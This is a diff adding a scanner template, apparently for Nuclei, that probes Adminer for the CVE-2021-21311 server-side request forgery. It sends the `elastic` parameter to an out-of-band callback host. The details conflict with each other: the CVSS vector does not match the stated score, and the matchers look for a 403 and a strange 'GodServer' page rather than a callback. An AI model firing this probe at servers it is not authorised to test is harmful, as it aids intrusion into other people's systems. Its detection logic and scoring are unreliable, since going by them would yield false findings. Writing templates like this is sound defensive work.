@@ -1,0 +1,36 @@
+id: adminer-api-ssrf-cve-2021-21311
+info:
+  name: Adminer API SSRF Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Adminer contains a Server-Side Request Forgery (SSRF) vulnerability when utilizing the `elastic` parameter. Attackers can potentially use this vulnerability to detect internal network information.
+  reference:
+    - https://github.com/vrana/adminer/commit/ccd2374b0b12bd547417bf0dacdf153826c83351
+  classification:
+    cve-id: CVE-2021-21311
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 7.5
+
+http:
+  - raw:
+      - |
+        GET /adminer?elastic={{interactsh-url}}&username= HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 403
+      - type: word
+        part: body
+        words:
+          - "<html><body>GodServer</body></html>"
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "<div class='error'>(.*?)</div>"
